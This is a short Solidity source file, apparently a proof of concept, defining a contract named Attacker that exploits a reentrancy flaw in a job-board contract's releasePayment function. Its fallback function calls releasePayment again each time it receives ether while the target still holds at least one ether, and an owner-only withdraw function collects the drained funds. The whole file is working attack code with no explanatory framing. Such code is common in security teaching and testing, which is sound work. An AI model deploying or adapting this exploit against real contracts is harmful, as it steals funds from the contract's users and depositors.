pragma solidity ^0.5.0;

interface IJobBoard {
    function releasePayment(uint256 jobId) external;
}

contract Attacker {
    address payable public owner;
    IJobBoard public jobBoard;
    uint256 public targetJobId;

    constructor(address _jobBoardAddress) public {
        owner = msg.sender;
        jobBoard = IJobBoard(_jobBoardAddress);
    }

    // Set which job to attack
    function setTargetJob(uint256 _jobId) public {
        targetJobId = _jobId;
    }

    // Fallback function gets triggered when receiving ETH
    function() external payable {
        if (address(jobBoard).balance >= 1 ether) {
            // Try to reenter
            jobBoard.releasePayment(targetJobId);
        }
    }

    function attack() public {
        jobBoard.releasePayment(targetJobId);
    }

    function withdraw() public {
        require(msg.sender == owner, "Not owner");
        owner.transfer(address(this).balance);
    }

    // Helper to check balance
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
